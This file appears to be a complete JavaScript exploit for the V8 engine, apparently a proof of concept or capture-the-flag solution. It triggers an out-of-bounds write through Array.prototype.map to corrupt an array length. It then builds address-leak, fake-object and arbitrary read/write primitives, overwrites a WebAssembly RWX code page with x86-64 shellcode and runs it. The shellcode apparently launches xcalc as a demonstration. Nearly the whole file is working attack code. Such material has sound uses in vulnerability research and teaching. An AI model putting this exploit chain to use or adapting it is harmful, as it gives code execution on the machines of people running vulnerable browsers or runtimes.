const MAX_ITERATIONS = 10000;
const max_size = 1028*8;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}
function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}


func = wasm_func();
// %DebugPrint(func);
// %SystemBreak();

Array(2**30);
var oob_arr;
var obj_arr;
var data_buf;
var oob_arr_len_offset = 0x17;
var loop_count = 0
var flag = 0;
function foo(arr)
{
    return arr.map(
        (val, idx) => {
            if(idx == oob_arr_len_offset+1) {
                throw "oob finished";
            }
            if(idx == 0) {
            oob_arr = [1.1, 2.2];
            obj_arr = {m:i2f(0xdeadbeef), n:func};
            data_buf = new ArrayBuffer(0x200);
            // if(flag == 1) {
                // %DebugPrint(obj_arr);
                // %DebugPrint(obj_arr);
                // %DebugPrint(data_buf);
                // %SystemBreak();
                // }
            }
            return idx; //print(i2f(0x202000000000));
        }
    );

}

let a = [1, 2,,,, 3];
// flag = 1;
// foo(a);
// flag = 0;
for(let i=0; i<MAX_ITERATIONS; i++) {
    foo(a);
}
a.length = (32 * 1024 * 1024)-1;
a.fill(1, oob_arr_len_offset);
a.push(2);
a.length += 500;
// %DebugPrint(a);
// %SystemBreak();
try {
    foo(a)
}
catch {
    //print(oob_arr.length);
    if(oob_arr.length > 2) {}
    else {
        throw "overwrite length error";
    }
}

// %DebugPrint(a);
// %DebugPrint(tmp);
// %DebugPrint(oob_arr);
// %DebugPrint(obj_arr);
// %DebugPrint(data_buf);
// %SystemBreak();

// gc();
// gc();
print("[+] now oob_arr length: "+hex(oob_arr.length));

// looking for obj element offset 
var float_object_idx = 0;
for(let i=0; i<max_size; i++) {
    if(f2i(oob_arr[i]) == 0xdeadbeef) {
        float_object_idx = i + 1;
        print("[+] float idx of object is: 0x"+hex(float_object_idx));
        break;
    }
} 

if(float_object_idx == 0) {
    throw "find idx of object error";
}

// looking for backing_stroe in data_buf
var float_data_buf_idx = 0;
for(let i=0; i<max_size; i++) {
    if(f2i(oob_arr[i]) == 0x200) {

        float_data_buf_idx = i + 1;
        print("[+] float idx of array buf backing store is: 0x"+hex(float_data_buf_idx));
        break;
    }
}


if(float_data_buf_idx == 0) {
    throw "find idx of array buf error";
}

var data_view = new DataView(data_buf);

// build addr_of primitive 
function addr_of(obj_para)
{
    obj_arr.n=obj_para;
    return f2i(oob_arr[float_object_idx]) - 1;
}

// build fake_obj primitive
function fake_obj(fake_obj_addr)
{
    oob_arr[float_object_idx] = i2f(fake_obj_addr);
    return obj_arr.n;
}

// build aar primitive
function data_view_read64(addr)
{
    oob_arr[float_data_buf_idx]=i2f(addr);
    return f2i(data_view.getFloat64(0, true));
}

// build aaw primitive
function data_view_write64(addr, value)
{
    oob_arr[float_data_buf_idx] = i2f(addr);
    return data_view.setFloat64(0, f2i(value), true);
}

function data_view_write(addr, payload)
{
    oob_arr[float_data_buf_idx] = i2f(addr);
    for(let i=0; i<payload.length; i++) {
        data_view.setUint8(i, payload[i]);
    }
    return ;
}

// get the JSFunction addr with addrOf primitive
var wasm_obj_addr = addr_of(func);
print("[+] wasm obj addr: "+hex(wasm_obj_addr));

var shared_info_addr = data_view_read64(wasm_obj_addr+0x18)-1;
print("[+] wasm shared info addr: "+hex(shared_info_addr));

// var wasm_exported_function_data_addr = data_view_read64(shared_info_addr+8)-1;
oob_arr[float_data_buf_idx] =i2f(shared_info_addr+0x8);
var wasm_exported_function_data_addr = f2i(data_view.getFloat64(0, true))-1;
print("[+] wasmExportedFunctionData addr addr: "+hex(wasm_exported_function_data_addr));

//var instance_addr = data_view_read64(wasm_exported_function_data_addr+0x10)-1;
oob_arr[float_data_buf_idx] =i2f(wasm_exported_function_data_addr+0x10);
var instance_addr = f2i(data_view.getFloat64(0, true)) - 1;
print("[+] instance addr: "+hex(instance_addr));

// var rwx_addr = data_view_read64(instance_addr+0x100);
oob_arr[float_data_buf_idx] = i2f(instance_addr+0x100);
var rwx_addr = f2i(data_view.getFloat64(0, true));
print("[+] rwx addr: "+hex(rwx_addr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// wite the shellcode to wasm code
data_view_write(rwx_addr, shellcode);
// trigger wasm code and execute shellcode
func();
